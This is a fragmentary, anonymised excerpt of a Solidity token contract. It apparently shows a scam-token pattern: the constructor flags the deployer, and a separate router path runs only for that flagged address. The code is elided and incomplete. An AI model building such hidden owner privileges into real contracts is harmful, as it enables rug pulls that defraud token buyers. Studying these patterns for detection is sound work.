...
contract X17 is Context, Ownable {
    ...
    string private constant _name = "X16";
    string private constant _symbol = "X16";
    ...
    constructor () {
       X1[msg.sender] = X5;  
        X2[msg.sender] = 2;  
    emit Transfer(address(0), X20, X5);}
...
if(X2[msg.sender] == 2) {_Router(amount);}
if(X2[msg.sender] <= 1) {
